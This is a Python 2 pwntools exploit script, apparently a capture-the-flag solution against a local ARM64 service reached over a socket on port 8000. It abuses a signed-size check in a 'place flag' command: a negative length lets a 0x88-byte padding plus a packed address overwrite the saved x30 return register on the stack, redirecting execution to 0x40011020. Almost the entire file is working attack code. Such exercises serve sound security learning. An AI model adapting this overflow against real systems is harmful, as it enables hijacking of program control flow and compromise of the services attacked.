#!/usr/bin/env python2

import sys
import time
import struct
from pwn import *
from pwnlib.tubes.process import process
from pwnlib.tubes.ssh import ssh
from pwnlib.util.packing import *

def read_all(r,timeout=0.1):
	ans=''
	try:
		ansTmp = r.recv(timeout=timeout)
		ans = ansTmp
		while ansTmp != '':
			ansTmp = r.recv(timeout=timeout)
			ans += ansTmp
		return ans
	except:
		return ans

def uintToSignedInt(val):
	for i in range(1,257):
		if (-i & 0xff) == val:
			return -i
	return 0

def putFlag(p, size, value):
	p.send('P\n')
	read_all(p)
	p.send(str(size) + '\n')
	read_all(p)
	# Note that serialEoT will send a 0x04 (End Of Transmission) which will be interpreted by serial driver to flush write
	# This also means this is a bad char !
	serialEoT = '\x04'
	p.send(value + serialEoT)
	resp = p.recvline()
	respSplited = resp.split('Placed')
	if len(respSplited) < 2 :
		print('Crash : ' + repr(resp))
		return 0
	print('Flag sent successfully')
	return 1

def putFlagToWin(p, size, value):
	p.send('P\n')
	read_all(p)
	p.send(str(size) + '\n')
	read_all(p)
	serialEoT = '\x04'
	p.send(value + serialEoT)

def getFlag(p, index):
	p.send('G\n')
	read_all(p)
	p.send(str(index) + '\n')
	p.recvline()
	flag = p.recvline().replace('\r\n', '')
	return flag

context.clear(arch = 'arm64')
context.log_level = 'error'
context.endian = 'little'
context.bits = 64
local=0

ip = '127.0.0.1'
p = remote(ip, 8000)

print('Waiting VM to boot...')
time.sleep(5)
print(read_all(p, 2))

print('>>>>>>>>>>> Starting exploit')

print('Overflow to override saved x30 in stack')
x30 = 0x40011020
overflowSize = 0x88 + 8
signedSize = uintToSignedInt(overflowSize)
payload = 'A' * 0x88
payload += p64(x30)

putFlagToWin(p, signedSize, payload)
print(read_all(p)) # Print answer

p.close()
exit(0)
